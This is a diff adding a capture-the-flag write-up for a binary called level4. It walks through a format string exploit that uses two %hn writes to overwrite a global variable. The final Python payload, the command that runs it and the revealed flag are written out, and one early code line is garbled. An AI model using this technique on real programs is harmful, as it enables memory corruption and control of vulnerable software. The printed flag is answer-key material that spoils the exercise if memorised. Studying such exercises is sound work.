@@ -1,0 +1,52 @@
+When we disas main of ./level4, we can see that's it's similar to the level3 exercise
+
+There's a n() function, and a v() function, and it uses fgets with a maximum lenght.
+With that informations, we cannot perfom a bufferoverflow. 
+
+In the other hand, we can see that, as the level3 program, after the printf,
+there's a variable comparaison but not with a little value like 0x40, but
+0x01025544.
+
+Equal to 16 930 116 in decimal.
+
+We cannot use a %Nx (where N = the value of the variable), cause it would take too much
+time to print.
+
+Our solution is to write that byte in two time, by using %hn, where h means short,
+and allows us to to write only 2 bytes instead 4.
+
+We will first write 0x0102 on 0x08049812 then write 5544 on 0x08049810.
+
+1 :
+Write the two first address to overwrite in your script
+
+Python :
+address = "address = "\x08\x04\x98\x12"[::-1] + "xxxx" + "\x08\x04\x98\x10"[::-1]"
+
+We must add "xxxx" between the both because after writing the 0x0102 (after the first %n)
+we will must add a %Nx, where the N represents the second padding in order to reach 0x5544
+
+2 :
+Now, by using the methodoligy used with the level3, we know our number of necessary %x,
+to reach the beginning our given format.
+Then also by the level3 methodoligy, we also calculate the paddings to use.
+
+Python :
+pads = ("%8x" * 10) + "%166x" + "%hn" + "%21570x" + "%hn"
+
+The final scripts looks like this :
+
+Python :
+address = "\x08\x04\x98\x12"[::-1] + "xxxx" + "\x08\x04\x98\x10"[::-1]
+pads = ("%8x" * 10) + "%166x" + "%hn" + "%21570x" + "%hn"
+print address + pads
+
+Execution :
+python /tmp/format.py | ./level4
+
+Prints :
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+
+
+
